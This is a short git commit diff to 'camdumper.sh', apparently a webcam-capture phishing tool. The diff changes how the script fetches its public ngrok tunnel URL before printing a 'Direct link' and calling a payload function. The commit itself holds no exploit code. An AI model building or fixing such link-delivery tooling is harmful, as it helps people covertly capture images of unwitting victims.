f61049ccb6b2118d12443cfae5e13fb55328ef75
KOMIK3R <shaspachu457@gmail.com>
2021-09-07 14:30:31 +0530

    link not generating issue fixed

--- camdumper.sh
+++ camdumper.sh
@@ -163,7 +163,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+link=$(curl -s http://127.0.0.1:4045/api/tunnels | jq '.tunnels[0].public_url')
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
